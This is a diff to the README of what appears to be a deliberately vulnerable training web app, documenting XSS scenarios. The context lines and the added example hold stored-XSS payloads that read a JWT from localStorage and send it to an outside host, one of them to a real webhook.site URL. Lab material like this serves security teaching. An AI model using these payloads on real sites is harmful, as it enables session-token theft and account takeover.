@@ -78,6 +78,8 @@ docker compose up --build
 
 payload get jwt token: <img src=x onerror=fetch("ISI DENGAN URL UNIK ANDA DISINI/?token="+localStorage.getItem('access')) />
 
+example : `<img src=x onerror="new Image().src='https://webhook.site/2c66c963-2bcf-4233-ac08-ada3a68572f8/?token='+localStorage.getItem('token')" />`
+
 ### 7. Reflected XSS
 **Scenario**: The search query on the Employee Directory page is reflected back to the user without escaping HTML characters.
 **Exploit**:
